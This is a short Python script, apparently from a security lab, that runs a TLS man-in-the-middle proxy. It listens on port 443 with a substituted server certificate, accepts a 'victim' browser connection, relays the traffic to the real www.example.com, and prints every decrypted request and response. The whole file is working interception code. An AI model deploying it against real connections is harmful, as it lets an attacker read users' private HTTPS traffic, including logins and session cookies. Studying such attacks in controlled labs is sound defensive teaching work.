#!/usr/bin/python3

import threading, socket, ssl, pprint

def process_request(ssock_for_browser):
    print("connected with victim, start redirecting")
    hostname = 'www.example.com'
    context=ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    context.load_default_certs()
    context.verify_mode=ssl.CERT_REQUIRED
    context.check_hostname=True
    # Make a connection to the real server


    sock_for_server = socket.create_connection((hostname, 443))
    ssock_for_server = context.wrap_socket(sock_for_server,server_hostname=hostname)

    print("ssl handshake with real server succeed")

    request = ssock_for_browser.recv(2048)
    if request:
    # Forward request to server
        print("client's request is")
        pprint.pprint(request)
        ssock_for_server.sendall(request)
    # Get response from server, and forward it to browser
        response = ssock_for_server.recv(2048)
    while response:
        print("server's repsonse is")
        pprint.pprint(response)
        ssock_for_browser.sendall(response) # Forward to browser
        response = ssock_for_server.recv(2048)

    ssock_for_browser.shutdown(socket.SHUT_RDWR)
    ssock_for_browser.close()


server_cert="../new_server.crt"
server_key="../server.key"

context= ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
context.load_cert_chain(server_cert,server_key)

sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
print("socket created successfully")
sock.bind(("0.0.0.0",443))
sock.listen(10)

while True:
    sock_for_browser, fromaddr = sock.accept()
    print("connected to client")
    ssock_for_browser = context.wrap_socket(sock_for_browser, server_side=True)
    x = threading.Thread(target=process_request, args=(ssock_for_browser,))
    x.start()


